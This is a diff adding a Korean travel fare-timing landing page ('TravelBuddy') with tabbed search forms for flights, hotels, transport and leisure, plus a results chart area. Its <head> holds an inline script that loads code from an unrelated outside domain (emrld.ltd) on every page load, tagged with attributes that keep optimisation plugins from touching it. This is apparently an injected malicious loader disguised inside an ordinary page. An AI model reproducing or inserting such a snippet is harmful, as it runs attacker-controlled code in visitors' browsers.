@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>여행의 시작 - 딱 좋은 타이밍 ✈️</title>
+    <!-- 가독성이 높은 Pretendard 폰트 사용 -->
+    <link rel="stylesheet" as="style" crossorigin href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/static/pretendard.min.css" />
+    <!-- 폰트어썸 (아이콘) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
+      (function () {
+          var script = document.createElement("script");
+          script.async = 1;
+          script.src = 'https://emrld.ltd/NTE0Mjg3.js?t=514287';
+          document.head.appendChild(script);
+      })();
+    </script>
+</head>
+<body>
+
+<header>
+    <div class="logo">🎒 TravelBuddy</div>
+</header>
+
+<main>
+    <!-- 메인 검색 섹션 -->
+    <section class="hero-section">
+        <h1>언제가 제일 쌀까요?</h1>
+        <p>복잡한 비교 말고, <strong>가장 좋은 타이밍만</strong> 쏙쏙 알려드릴게요!</p>
+        
+        <div class="search-card">
+            <!-- 탭 메뉴 -->
+            <div class="tabs-container">
+                <button class="tab-btn active" data-target="flight"><i class="fa-solid fa-plane"></i> 항공</button>
+                <button class="tab-btn" data-target="hotel"><i class="fa-solid fa-bed"></i> 숙박</button>
+                <button class="tab-btn" data-target="transport"><i class="fa-solid fa-car"></i> 교통</button>
+                <button class="tab-btn" data-target="leisure"><i class="fa-solid fa-person-swimming"></i> 레저</button>
+            </div>
+            
+            <div class="tab-content">
+                <!-- ✈️ 항공 탭 -->
+                <div id="flight" class="tab-pane active">
+                    <div class="form-row trip-type">
+                        <label><input type="radio" name="trip" checked> 왕복</label>
+                        <label><input type="radio" name="trip"> 편도</label>
+                        <label><input type="radio" name="trip"> 다구간</label>
+                    </div>
+                    <div class="form-row multi-input">
+                        <div class="input-group">
+                            <label>출발지</label>
+                            <input type="text" value="제주(CJU)" placeholder="어디서 출발하시나요?">
+                        </div>
+                        <div class="swap-icon"><i class="fa-solid fa-right-left"></i></div>
+                        <div class="input-group">
+                            <label>도착지</label>
+                            <input type="text" value="방콕(BKK)" placeholder="어디로 떠나고 싶나요?">
+                        </div>
+                    </div>
+                    <div class="form-row multi-input">
+                        <div class="input-group">
+                            <label>가는 날 - 오는 날</label>
+                            <input type="text" value="10.24 (목) - 10.28 (월)" placeholder="날짜 선택">
+                        </div>
+                        <div class="input-group">
+                            <label>인원 및 좌석 / 가격 필터</label>
+                            <input type="text" value="성인 1명, 일반석, 직항 우선">
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 🏨 숙박 탭 -->
+                <div id="hotel" class="tab-pane">
+                    <div class="form-row multi-input">
+                        <div class="input-group">
+                            <label>도시는 어디인가요?</label>
+                            <input type="text" placeholder="예: 방콕, 오사카, 제주도">
+                        </div>
+                    </div>
+                     <div class="form-row multi-input">
+                        <div class="input-group">
+                            <label>체크인 - 체크아웃</label>
+                            <input type="text" placeholder="날짜 선택">
+                        </div>
+                        <div class="input-group">
+                            <label>인원 및 조건 / 가격 필터</label>
+                            <input type="text" placeholder="성인 2명, 1박 10만원 이하">
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 🚗 교통 탭 -->
+                <div id="transport" class="tab-pane">
+                     <div class="form-row multi-input">
+                        <div class="input-group">
+                            <label>대여 및 이용 위치</label>
+                            <input type="text" placeholder="목적지 공항 또는 기차역">
+                        </div>
+                        <div class="input-group">
+                            <label>어떤 교통수단을 찾으시나요?</label>
+                            <select>
+                                <option>렌터카 🚗</option>
+                                <option>기차 🚆</option>
+                                <option>배/페리 ⛴️</option>
+                                <option>공항 픽업 🚖</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 🤿 레저 탭 -->
+                <div id="leisure" class="tab-pane">
+                     <div class="form-row multi-input">
+                        <div class="input-group">
+                            <label>가슴 설레는 액티비티를 찾아보세요!</label>
+                            <input type="text" value="상해 디즈니랜드" placeholder="예: 보홀 스쿠버다이빙, 파리 디즈니랜드">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 딱딱한 "검색" 대신 소비자가 혜택을 시각화할 수 있는 버튼 -->
+            <button id="search-btn" class="search-btn">최저가 타이밍 확인하기 🔍</button>
+        </div>
+    </section>
+
+    <!-- ⏳ 로딩 스피너 (애니메이션 노출 영역) -->
+    <div id="loading" class="loading-container hidden">
+        <div class="spinner"></div>
+        <p>전 세계 항공권 데이터를 샅샅이 뒤지는 중... 🕵️‍♀️</p>
+    </div>
+
+    <!-- 📊 검색 결과 섹션 (Fade-in 노출 영역) -->
+    <section id="results" class="results-section hidden">
+        <!-- CVR 훅(Hook) 마이크로카피 -->
+        <div class="result-header">
+            <h2>🔥 지금 예약하면 평소보다 <span class="highlight">약 3만 원 이득!</span></h2>
+            <p>11월 초에 출발하는 일정이 가장 저렴해요. 예매를 서두르세요!</p>
+        </div>
+        
+        <div class="chart-card">
+            <h3>가격 추이 (제주 ➔ 방콕)</h3>
+            <div class="chart-wrapper">
+                <canvas id="priceChart"></canvas>
+            </div>
+        </div>
+        
+        <div class="recommendations">
+            <h3>방금 찾은 꿀가성비 항공권 추천 🍯</h3>
+            <div class="card-grid" id="card-grid">
+                <!-- JS에서 더미 데이터 기반 카드가 렌더링 됩니다 -->
+            </div>
+        </div>
+    </section>
+</main>
+
+<!-- Chart.js CDN -->
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
